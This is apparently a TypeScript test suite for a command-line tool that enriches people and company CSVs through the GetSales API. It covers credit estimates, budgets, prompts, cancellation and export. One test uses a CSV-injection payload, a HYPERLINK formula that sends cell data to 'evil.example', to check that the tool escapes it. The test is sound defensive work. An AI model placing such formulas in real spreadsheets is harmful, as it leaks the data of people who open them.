import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { EXIT_FAILED, EXIT_INTERRUPTED, EXIT_OK, EXIT_USAGE, main, type CliIo } from '../src/cli.js';
import { parseCsv } from '../src/csv.js';
import { noSleep } from './helpers/mockApi.js';
import { ADA_EMAIL, COMPANY_CSV, PEOPLE_CSV, SIDS, creditsEstimate, flowApi, progress, type ScenarioOptions } from './helpers/scenario.js';

const KEY = 'gs_live_test0000000000000000000000000000000000';

const cliSetup = (options: { scenario?: ScenarioOptions; files?: Record<string, string>; answer?: string; interactive?: boolean; env?: Record<string, string>; signal?: AbortSignal } = {}) => {
  const { api } = flowApi(options.scenario);
  const files: Record<string, string> = { 'people.csv': PEOPLE_CSV, ...(options.files ?? {}) };
  const written: Record<string, string> = {};
  const out: string[] = [];
  const err: string[] = [];
  const questions: string[] = [];
  const io: CliIo = {
    env: options.env ?? { GETSALES_API_KEY: KEY },
    stdout: { write: (chunk: string) => out.push(chunk) },
    stderr: { write: (chunk: string) => err.push(chunk) },
    interactive: options.interactive ?? true,
    prompt: async (question) => {
      questions.push(question);
      return options.answer ?? 'n';
    },
    readFile: async (path) => {
      const content = files[path];
      if (content === undefined) throw new Error(`ENOENT: ${path}`);
      return content;
    },
    writeFile: async (path, data) => {
      written[path] = data;
    },
    exists: (path) => path in files || path in written,
    fetch: api.fetch,
    sleep: noSleep,
    now: () => new Date('2026-11-03T10:00:00Z'),
    ...(options.signal ? { signal: options.signal } : {}),
  };
  return { api, io, written, out: () => out.join(''), err: () => err.join(''), questions };
};

describe('cli', () => {
  it('runs the whole flow with --yes and --max-credits, and writes the enriched CSV', async () => {
    const h = cliSetup();
    const code = await main(['people.csv', '--yes', '--max-credits', '5'], h.io);
    assert.equal(code, EXIT_OK, h.err());
    assert.equal(h.questions.length, 0, '--yes never asks');
    const run = h.api.callsTo('POST', /\/playtable-runs$/)[0]?.body as { max_budget: number };
    assert.equal(run.max_budget, 5);
    const csv = h.written['people.enriched.csv'];
    assert.ok(csv, 'output written next to the input');
    const table = parseCsv(csv);
    assert.equal(table.rows.length, 4);
    assert.equal(table.rows[0]?.[table.headers.indexOf('enrichment_result')], ADA_EMAIL);
    assert.match(h.out(), /Run pt_rn_test00000001 finished: 1 of 5 credits spent/);
    assert.match(h.out(), new RegExp(`export people.csv --table ${SIDS.table} --source ${SIDS.source} --column ${SIDS.field}`));
    assert.match(h.err(), /Estimate for 2 rows/);
  });

  it('refuses --yes without --max-credits before any request', async () => {
    const h = cliSetup();
    const code = await main(['people.csv', '--yes'], h.io);
    assert.equal(code, EXIT_USAGE);
    assert.match(h.err(), /needs --max-credits/);
    assert.equal(h.api.calls.length, 0);
  });

  it('asks before the run and stops on anything but yes', async () => {
    const h = cliSetup({ answer: 'no thanks' });
    const code = await main(['people.csv', '--finders', 'findymail,hunter', '--use-row-email', '--verify', 'emaillistverify'], h.io);
    assert.equal(code, EXIT_OK);
    assert.equal(h.questions.length, 1);
    assert.match(h.questions[0] ?? '', /Start the run on 2 rows \(0 to 6 credits, likely 2\.4\) with a budget of 6 credits\? \[y\/N\]/);
    assert.equal(h.api.callsTo('POST', /\/playtable-runs$/).length, 0);
    assert.equal(Object.keys(h.written).length, 0);
    assert.match(h.out(), /Not started: no run, no credits spent/);
    const field = h.api.callsTo('POST', /\/playtable-fields$/)[0]?.body as { payload: { steps: Array<{ tool_sid: string }> } };
    assert.deepEqual(
      field.payload.steps.map((step) => step.tool_sid),
      ['row:people.work_email', 'in:findymail.email.find', 'in:hunter.email.find'],
    );
  });

  it('starts the run on yes', async () => {
    const h = cliSetup({ answer: 'Y' });
    const code = await main(['people.csv'], h.io);
    assert.equal(code, EXIT_OK, h.err());
    assert.equal(h.api.callsTo('POST', /\/playtable-runs$/).length, 1);
  });

  it('shows the estimate as a range from min to max with expected as the likely figure, asks with it, and budgets the max', async () => {
    const h = cliSetup({ answer: 'y', scenario: { estimate: creditsEstimate(1.5, 2.25, 6) } });
    const code = await main(['people.csv'], h.io);
    assert.equal(code, EXIT_OK, h.err());
    const lines = h.err().split('\n');
    const at = lines.indexOf('Estimate for 2 rows: 1.5 to 6 credits, likely 2.25.');
    assert.ok(at >= 0, h.err());
    assert.equal(lines[at + 1], '  1.5 if every row ends on its cheapest step, 6 if every row runs the whole chain.');
    assert.equal(lines[at + 2], "Run budget: 6 credits (the estimate's maximum).");
    assert.deepEqual(h.questions, ['Start the run on 2 rows (1.5 to 6 credits, likely 2.25) with a budget of 6 credits? [y/N] ']);
    const run = h.api.callsTo('POST', /\/playtable-runs$/)[0]?.body as { max_budget: number };
    assert.equal(run.max_budget, 6, 'the budget is the max, never the expected 2.25');
  });

  it('refuses to wait for an answer with no terminal', async () => {
    const h = cliSetup({ interactive: false });
    assert.equal(await main(['people.csv'], h.io), EXIT_USAGE);
    assert.match(h.err(), /No terminal to ask in/);
    assert.equal(h.api.calls.length, 0);
  });

  it('runs --estimate-only with no terminal and spends nothing', async () => {
    const h = cliSetup({ interactive: false });
    assert.equal(await main(['people.csv', '--estimate-only'], h.io), EXIT_OK, h.err());
    assert.equal(h.api.callsTo('POST', /\/playtable-runs$/).length, 0);
    assert.match(h.out(), /Estimate only/);
  });

  it('needs the API key, an input and a free output path, all before any request', async () => {
    const noKey = cliSetup({ env: {} });
    assert.equal(await main(['people.csv'], noKey.io), EXIT_USAGE);
    assert.match(noKey.err(), /GETSALES_API_KEY/);
    const noInput = cliSetup();
    assert.equal(await main([], noInput.io), EXIT_USAGE);
    const taken = cliSetup({ files: { 'people.enriched.csv': 'old' } });
    assert.equal(await main(['people.csv', '--yes', '--max-credits', '5'], taken.io), EXIT_USAGE);
    assert.match(taken.err(), /exists. Pass --overwrite/);
    for (const h of [noKey, noInput, taken]) assert.equal(h.api.calls.length, 0);
  });

  it('rejects unknown options, bad numbers and email flags beside --steps', async () => {
    const unknown = cliSetup();
    assert.equal(await main(['people.csv', '--auto-run'], unknown.io), EXIT_USAGE);
    const badCap = cliSetup();
    assert.equal(await main(['people.csv', '--yes', '--max-credits', 'lots'], badCap.io), EXIT_USAGE);
    const clash = cliSetup({ files: { 'steps.json': '{"steps":[]}' } });
    assert.equal(await main(['people.csv', '--steps', 'steps.json', '--verify', 'emaillistverify'], clash.io), EXIT_USAGE);
    assert.match(clash.err(), /drop --verify/);
  });

  it('runs company rows from a steps file', async () => {
    const steps = JSON.stringify({ steps: [{ tool_sid: `in:tool.${SIDS.tool}`, params: { domain: '{{company.domain}}' } }] });
    const h = cliSetup({ scenario: { objectType: 'company' }, files: { 'companies.csv': COMPANY_CSV, 'steps.json': steps } });
    const code = await main(['companies.csv', '--object', 'company', '--steps', 'steps.json', '--yes', '--max-credits', '3', '-o', 'out.csv'], h.io);
    assert.equal(code, EXIT_OK, h.err());
    assert.ok(h.written['out.csv']);
    assert.equal(h.api.callsTo('POST', /\/companies\/search$/).length, 1);
  });

  it('prints the server error and the sids created before it', async () => {
    const h = cliSetup({ scenario: { importStatus: 'failed', importStatusReason: 'allowance_exhausted' } });
    assert.equal(await main(['people.csv', '--yes', '--max-credits', '5'], h.io), EXIT_FAILED);
    assert.match(h.err(), /The import stopped \(failed: allowance_exhausted\)/);
    assert.match(h.err(), new RegExp(`playtableSid ${SIDS.table}`));
  });

  it('says the run was cancelled in GetSales, and when that happens, if the server stops it', async () => {
    const h = cliSetup({ scenario: { runStates: [progress('running', 1, 1), progress('cancelled', 1, 2)] } });
    const code = await main(['people.csv', '--yes', '--max-credits', '2'], h.io);
    assert.equal(code, EXIT_OK, h.err());
    assert.match(h.err(), /Run budget: 2 credits \(your budget, below the estimate's maximum\)\./);
    assert.match(
      h.out(),
      /Run pt_rn_test00000001 was cancelled in GetSales \(for example when its spend reached the budget or the workspace ran out of credits\): 2 credits spent, budget 2\./,
    );
    assert.ok(h.written['people.enriched.csv'], 'the rows done before the stop are written');
  });

  it('writes a result that would run as a spreadsheet formula with a leading apostrophe', async () => {
    const formula = '=HYPERLINK("https://evil.example/?d="&A2,"Open")';
    const cell = { sid: 'pt_vl_ada000000001', playtable_sid: SIDS.table, playtable_field_sid: SIDS.field, object_sid: SIDS.ada, value: formula, status: 'done' as const, cost: 1, error_msg: '@note' };
    const h = cliSetup({ scenario: { cells: { [SIDS.ada]: cell } } });
    assert.equal(await main(['people.csv', '--yes', '--max-credits', '5'], h.io), EXIT_OK, h.err());
    const table = parseCsv(h.written['people.enriched.csv'] ?? '');
    const first = table.rows[0] ?? [];
    assert.equal(first[table.headers.indexOf('enrichment_result')], `'${formula}`);
    assert.equal(first[table.headers.indexOf('enrichment_note')], "'@note");
    assert.equal(first[table.headers.indexOf('Full name')], 'Ada Quill');
  });

  it('exits 130 after Ctrl-C cancels the run, with the CSV of the rows done', async () => {
    const controller = new AbortController();
    const h = cliSetup({ scenario: { runStates: [progress('running', 1, 1)] }, signal: controller.signal });
    const write = h.io.stderr.write;
    h.io.stderr = {
      write: (chunk: string) => {
        if (chunk.startsWith('Started run')) controller.abort();
        return write(chunk);
      },
    };
    const code = await main(['people.csv', '--yes', '--max-credits', '5'], h.io);
    assert.equal(code, EXIT_INTERRUPTED);
    const cancels = h.api.callsTo('POST', /^\/playtables\/v1\/api\/playtable-runs\/cancel$/);
    assert.equal(cancels.length, 1);
    assert.deepEqual(cancels[0]?.body, { run_sid: SIDS.run, dry_run: false });
    assert.match(h.err(), /Cancelled the run: 1 queued cell sent back, 1 running cell finishes and is charged\. Credits spent so far: 1\./);
    assert.ok(h.written['people.enriched.csv']);
  });

  it('exports again from the printed sids', async () => {
    const h = cliSetup();
    const code = await main(['export', 'people.csv', '--table', SIDS.table, '--source', SIDS.source, '--column', SIDS.field, '-o', 'again.csv'], h.io);
    assert.equal(code, EXIT_OK, h.err());
    const table = parseCsv(h.written['again.csv'] ?? '');
    assert.equal(table.rows.length, 4);
    assert.deepEqual(
      h.api.trail().map((line) => line.split(' ')[1]),
      ['/playtables/v1/api/data-source-items/search', '/playtables/v1/api/data-source-items/search', '/playtables/v1/api/people/search'],
    );
  });

  it('prints help and the version', async () => {
    const h = cliSetup();
    assert.equal(await main(['--help'], h.io), EXIT_OK);
    assert.match(h.out(), /Usage:/);
    const v = cliSetup();
    assert.equal(await main(['--version'], v.io), EXIT_OK);
    assert.match(v.out(), /^\d+\.\d+\.\d+\n$/);
  });
});
